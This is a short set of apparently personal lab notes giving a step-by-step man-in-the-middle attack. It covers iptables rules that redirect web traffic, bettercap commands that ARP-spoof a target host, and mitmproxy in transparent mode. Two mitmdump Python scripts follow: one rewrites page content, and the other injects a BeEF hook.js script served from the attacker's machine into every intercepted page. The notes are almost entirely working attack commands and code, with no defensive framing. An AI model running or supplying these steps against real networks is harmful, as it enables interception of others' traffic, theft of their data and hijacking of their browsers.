Listen network:
 
Redirect http and https traffic to port 8080:
 
	•	iptables -t nat -F
	•	iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
	•	iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
	•	sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
	•	echo "1" > /proc/sys/net/ipv6/conf/all/forwarding
	•	echo "0" > /proc/sys/net/ipv4/conf/all/send_redirects
 
Active ARP spoofing:
 
	•	bettercap
	•	set arp.spoof.targets 10.0.2.4
	•	set arp.spoof.fullduplex true
	•	arp.spoof on
 
Active MITM listening:
 
	•	mitmproxy --mode transparent --listen-host 10.0.2.5 #kali ip
 
Mitmdump & Beef:
 
Creation and injection Python:
 
	•	nano myscript.py
 
from mitmproxy import http
 
def response(flow: http.HTTPFlow):
    reflector = b"HACKED"
    flow.response.content = flow.response.content.replace(b"Science", reflector)
 
	•	mitmdump -s myscript.py --mode transparent --listen-host 10.0.0.4 --anticache
 
Install and use browser with beef:
 
	•	nano myscript.py
 
from mitmproxy import http
 
def response(flow: http.HTTPFlow):
    reflector = bytes("<script src='http://10.0.2.5:3000/hook.js'></script>", "UTF-8")
    flow.response.content = flow.response.content.replace(b"</head>", reflector)
 
	•	mitmdump -s myscript.py --mode transparent --listen-host 10.0.0.4 --anticache
 
Bettercap:
 
	•	net.show
	•	net.probe on
	•	net.show
	•	ticker on
 
	•	bettercap -T 10.1.1.12
 
https://www.kalitut.com/2019/04/how-to-install-and-use-bettercap.html
 
https://github.com/aancw/bettercap-ng/blob/master/caplets/beef-inject.js
